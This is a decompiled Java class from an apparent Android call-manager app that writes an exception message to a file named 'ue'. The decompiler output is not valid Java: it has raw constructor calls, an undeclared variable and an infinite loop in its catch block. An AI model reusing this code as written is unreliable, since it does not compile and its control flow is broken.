package com.fx.daemon.a;

import com.vvt.b.b;
import com.vvt.h.a;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;

public class d
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  
  public static void a(String paramString, Throwable paramThrowable)
  {
    bool = a;
    if (bool) {}
    Object localObject1 = "ue";
    try
    {
      b.a(paramString, (String)localObject1);
      bool = a;
      if (bool) {}
      localObject1 = new java/io/File;
      Object localObject2 = "ue";
      ((File)localObject1).<init>(paramString, (String)localObject2);
      localObject2 = new java/io/BufferedWriter;
      FileWriter localFileWriter = new java/io/FileWriter;
      localFileWriter.<init>((File)localObject1);
      ((BufferedWriter)localObject2).<init>(localFileWriter);
      localObject1 = paramThrowable.toString();
      ((BufferedWriter)localObject2).write((String)localObject1);
      ((BufferedWriter)localObject2).close();
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = a;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/fx/daemon/getInstance/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */